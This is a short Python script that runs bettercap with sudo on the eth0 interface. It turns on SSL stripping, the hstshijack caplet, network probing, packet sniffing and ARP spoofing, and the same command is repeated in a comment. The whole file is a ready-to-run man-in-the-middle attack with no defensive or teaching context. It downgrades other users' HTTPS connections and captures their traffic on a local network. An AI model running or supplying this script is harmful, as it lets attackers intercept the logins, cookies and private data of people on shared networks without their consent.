import subprocess

# subprocess.run('sudo bettercap -iface eth0 -eval "set http.proxy.sslstrip true; hstshijack/hstshijack; net.probe on; net.sniff on; arp.spoof on;"', shell=True)
bettercap_eval = (
    "set http.proxy.sslstrip true; "
    "hstshijack/hstshijack; "
    "net.probe on; "
    "net.sniff on; "
    "arp.spoof on;"
)

bettercap_cmd = [
    "sudo",
    "bettercap",
    "-iface",
    "eth0",
    "-eval",
    bettercap_eval
]

subprocess.run(bettercap_cmd)